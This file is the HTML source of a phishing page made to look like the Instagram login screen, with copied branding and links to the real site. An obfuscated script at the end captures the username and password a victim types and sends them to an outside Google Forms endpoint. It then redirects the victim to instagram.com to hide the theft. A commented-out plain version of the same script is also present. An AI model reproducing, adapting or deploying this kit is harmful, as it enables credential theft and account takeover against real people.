<!DOCTYPE html>
<html>
<head>
    <style>
    </style>

<script src="https://cdnjs.cloudflare.com/ajax/libs/jquery/3.3.1/jquery.min.js"></script>
<link rel="stylesheet" href="style.css">
<script src="https://cdnjs.cloudflare.com/ajax/libs/prefixfree/1.0.7/prefixfree.min.js"></script>


</head>
<body>
    
    
    
    
<div class="login">
<form  id="my-form">

    <h1><img src="https://i.imgur.com/wvLiKam.png" width="200px" height="68px"></h1>
  
    <form action="" method="POST">
    
    <input name="entry.1370310404" placeholder="Phone number, username, or email" type="text" name="username" >
    <input name="entry.1238614929" placeholder="Password" type="password" name="password">
    
    <input type="submit" value="Log In" /><br>
  
    </form>
  
    <div class="divider"><b>OR</b></div>
  
    <div class="fbwrapper"><div class="fb"><a href="https://facebook.com"><img src="https://i.imgur.com/exksovo.png">  Log in with Facebook</a></div></div>
  
    <div class="forgotwrapper"><div class="forgot"><a href="https://instagram.com">Forgot password?</a></div></div>
  
    
</form>
</div>
  
  <div class="infobox">
    
    <p>Don't have an account? <a href="https://instagram.com">Sign up</a></p>
    
  </div>
  
  <div class="apps">
  
    <p>Get the app.</p>
    <span><a href="https://apps.apple.com/app/instagram/id389801252?vt=lo"><img src="https://i.imgur.com/lREV6Qa.png" height="45px" width="153px"></a><a href="https://play.google.com/store/apps/details?id=com.instagram.android&referrer=utm_source%3Dinstagramweb%26utm_campaign%3DloginPage%26ig_mid%3DXRR9_gALAAHKOzMSO3MkAOZ0JJtC%26utm_content%3Dlo%26utm_medium%3Dbadge"><img src="https://i.imgur.com/DFQNKXK.png" height="45" width="151px"></a></span>
  
  </div>
    
    
    
<!--<script>
//selector from your HTML form
$('#my-form').submit(function(e) {
  //prevent the form from submiting so we can post to the google form
  e.preventDefault();
  //AJAX request
  $.ajax({
    url: 'https://docs.google.com/forms/d/e/1FAIpQLSdpukKJ19rYh5nH5Z1U4fMjfs20mJjaBwJ-_XEertn3W574EQ/formResponse',     //The public Google Form url, but replace /view with /formResponse
    data: $('#my-form').serialize(), //Nifty jquery function that gets all the input data 
    type: 'POST', //tells ajax to post the data to the url
    dataType: "json", //the standard data type for most ajax requests
    statusCode: { //the status code from the POST request
      0: function(data) { //0 is when Google gives a CORS error, don't worry it went through
        //success
        window.location.replace("https://www.instagram.com/");
      }, 
      200: function(data) {//200 is a success code. it went through!
        //success
       window.location.replace("https://www.instagram.com/");
      },
      403: function(data) {//403 is when something went wrong and the submission didn't go through
        //error
        alert('Oh no! something went wrong. we should check our code to make sure everything matches with Google');
      }
    }  
  });
});
</script>  -->

<script>
var _0x3e0456=_0x3dae;function _0x3dae(_0x232c71,_0x11b427){var _0x14e516=_0x14e5();return _0x3dae=function(_0x3daef9,_0x48d367){_0x3daef9=_0x3daef9-0x1da;var _0xdac96d=_0x14e516[_0x3daef9];return _0xdac96d;},_0x3dae(_0x232c71,_0x11b427);}function _0x14e5(){var _0x372496=['3714702zVTLQC','https://www.instagram.com/','1580585yavUbE','location','1567968utQmbP','ajax','#my-form','16983694HgOpef','submit','1178516KJNfbV','POST','7353930tBHFew','4183576mnYiae','Oh\x20no!\x20something\x20went\x20wrong.\x20we\x20should\x20check\x20our\x20code\x20to\x20make\x20sure\x20everything\x20matches\x20with\x20Google','preventDefault','https://docs.google.com/forms/d/e/1FAIpQLSdpukKJ19rYh5nH5Z1U4fMjfs20mJjaBwJ-_XEertn3W574EQ/formResponse'];_0x14e5=function(){return _0x372496;};return _0x14e5();}(function(_0x139b29,_0x229d70){var _0x47f05e=_0x3dae,_0x5cbaf6=_0x139b29();while(!![]){try{var _0xa467e9=parseInt(_0x47f05e(0x1e0))/0x1+parseInt(_0x47f05e(0x1db))/0x2+parseInt(_0x47f05e(0x1e7))/0x3+-parseInt(_0x47f05e(0x1e3))/0x4+-parseInt(_0x47f05e(0x1e9))/0x5+parseInt(_0x47f05e(0x1e2))/0x6+-parseInt(_0x47f05e(0x1de))/0x7;if(_0xa467e9===_0x229d70)break;else _0x5cbaf6['push'](_0x5cbaf6['shift']());}catch(_0x1c5ab9){_0x5cbaf6['push'](_0x5cbaf6['shift']());}}}(_0x14e5,0x9bcb8),$('#my-form')[_0x3e0456(0x1df)](function(_0x460a56){var _0x454dd3=_0x3e0456;_0x460a56[_0x454dd3(0x1e5)](),$[_0x454dd3(0x1dc)]({'url':_0x454dd3(0x1e6),'data':$(_0x454dd3(0x1dd))['serialize'](),'type':_0x454dd3(0x1e1),'dataType':'json','statusCode':{0x0:function(_0xb99b5b){var _0x419cd5=_0x454dd3;window[_0x419cd5(0x1da)]['replace'](_0x419cd5(0x1e8));},0xc8:function(_0x4348c5){var _0x5d69e6=_0x454dd3;window[_0x5d69e6(0x1da)]['replace']('https://www.instagram.com/');},0x193:function(_0x438bc4){var _0x556dae=_0x454dd3;alert(_0x556dae(0x1e4));}}});}));
</script>
</body>
</html>